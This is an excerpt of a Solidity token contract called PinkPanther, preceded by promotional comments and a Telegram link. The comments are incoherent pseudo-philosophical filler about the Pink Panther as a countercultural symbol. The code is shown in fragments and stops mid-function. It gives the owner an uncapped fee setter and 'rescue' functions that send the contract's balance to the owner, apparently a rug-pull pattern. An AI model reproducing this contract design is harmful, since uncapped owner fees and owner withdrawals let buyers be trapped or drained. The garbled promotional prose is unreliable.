...
//  The PinkPanther mascot embodies a fascinating symbology that is both subversive and revolutionary. Pink Panther are creatures that are often overlooked, dismissed, and even reviled by the dominant cultural paradigm, which values hierarchical structures and ruthless competition. However, the PinkPanther flips the script 

//  Indeed, the Pink Panther  embodies an ethos that has its roots in the early 2000 and the neoprimitivist movement. It rejects the polished veneer of mainstream culture and embraces a rough-edged, do-it-yourself aesthetic that celebrates the imperfections and contradictions of human experience. The Pink Panther  represents a fierce independence that is unapologetic and unafraid to challenge the status quo.

//  In terms of cinema, the Pink Panther reminds me of my child hood memories who often explores the dark and twisted corners of human consciousness., the Pink Panther  is a manifestation of the uncanny and the surreal, which disrupts the smooth surface of reality and exposes the underlying chaos and unpredictability of existence.

// https://t.me/PinkPantherPortal
...
contract PinkPanther is Context, IERC20, Ownable {
    ...
    uint256 public _taxSwap=((_tTotal*10)/1000);
    ...
    function _fees(uint256 _newfees) external onlyOwner{
        _totalfees=_newfees;
    }
    ...
    function _rescue() external onlyOwner{
        _distributeTaxes(address(this).balance);
    }
    function _rescue(uint256 amount) external onlyOwner{
        if (amount == 0 || amount > balanceOf(address(this))) {
            amount = balanceOf(address(this));
        }
        _transfer(address(this),owner(),amount);       
    }
    function _marketing(address _new_addy) external onlyOwner{
